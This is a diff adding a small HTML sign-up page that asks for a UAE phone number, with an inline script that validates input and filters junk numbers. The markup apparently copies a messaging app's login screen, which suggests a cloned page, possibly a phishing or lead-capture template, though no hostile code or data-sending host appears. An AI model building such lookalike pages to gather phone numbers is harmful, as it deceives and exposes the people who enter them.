@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"
+    />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="main.css">
+    <title>test</title>
+  </head>
+  <body>
+  <div class="auth-form">
+    <div id="logo">
+
+    </div>
+    <h2>Sign up</h2>
+    <p class="note">Please confirm your country code and enter your phone number.</p>
+
+    <form action="">
+
+      <div class="DropdownMenu CountryCodeInput">
+        <div class="input-group">
+<!--          <input class="form-control" type="text" id="sign-in-phone-code" autocomplete="off"/>-->
+          <label>Country</label>
+          <div class="form-control">
+            <div role="button" tabindex="0" class="MenuItem">
+              <span class="country-flag"><img class="emoji" src="1f1e6-1f1ea.png" alt="🇦🇪"></span>
+              <span class="country-name">United Arab Emirates</span>
+<!--              <span class="country-code">971</span></div>-->
+          </div>
+<!--          <i class="css-icon-down"></i>-->
+        </div>
+        <div class="Menu no-selection CountryCodeInput">
+          <div class="backdrop"></div>
+          <div class="bubble menu-container custom-scroll top left opacity-transition fast " style="transform-origin: left top;">
+
+          </div>
+        </div>
+      </div>
+
+      <div class="input-group with-label">
+        <input
+          class="form-control in-put"
+          type="text"
+          id="sign-in-phone-number"
+          inputmode="tel"
+          maxlength="9"
+          autocomplete="off"
+          required
+        />
+        <div class="region-code">
+          +971
+        </div>
+        <label for="sign-in-phone-number">Your phone number</label>
+      </div>
+        <p class="error"></p>
+
+      <label class="Checkbox">
+        <input type="checkbox" id="sign-in-keep-session" />
+        <span class="Checkbox-main">
+          <span class="label" dir="auto">Keep me signed in</span>
+        </span>
+      </label>
+
+        <button class="btn-primary btn-color-primary rp" style="">
+          <span class="c-ripple"></span>
+          <span class="i18n">Next</span>
+        </button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+
+      let form = document.querySelector('form');
+      let input = document.querySelector('#sign-in-phone-number');
+      let button = document.querySelector('.btn-primary');
+
+      input.oninput = () => {
+          input.value = input.value.replace(/[^0-9]/, '');
+
+          if (input.value.substr(0, 2) === '05') {
+              input.setAttribute('maxlength', '10');
+          } else if (input.value.substr(0, 3) === '971') {
+              input.setAttribute('maxlength', '12');
+          } else {
+              input.setAttribute('maxlength', '9');
+          }
+      }
+
+      form.onsubmit = (e) => {
+          e.preventDefault();
+
+          let inputArray = input.value.split('');
+          let inputArrayUnique = unique(inputArray);
+
+          if (inputArrayUnique.length < 5 || input.value.indexOf('12345') > -1) {
+              phoneError();
+              return;
+          }
+
+          button.setAttribute('disabled', 'disabled');
+          form.submit();
+      }
+
+      function unique(array) {
+          let unique = [];
+
+          array.forEach(el => {
+              if (!unique.includes(el)) {
+                  unique.push(el);
+              }
+          });
+
+          return unique;
+      }
+
+      function phoneError() {
+          document.querySelector('.error').innerHTML = 'Check your number format and try again';
+      }
+
+      input.addEventListener('input', function () {
+          if (input.value.length <= 5 ) {
+              button.style.visibility = 'hidden'
+          }
+          else   {
+              button.style.visibility = 'visible'
+          }
+      })
+
+
+  </script>
+  </body>
+</html>
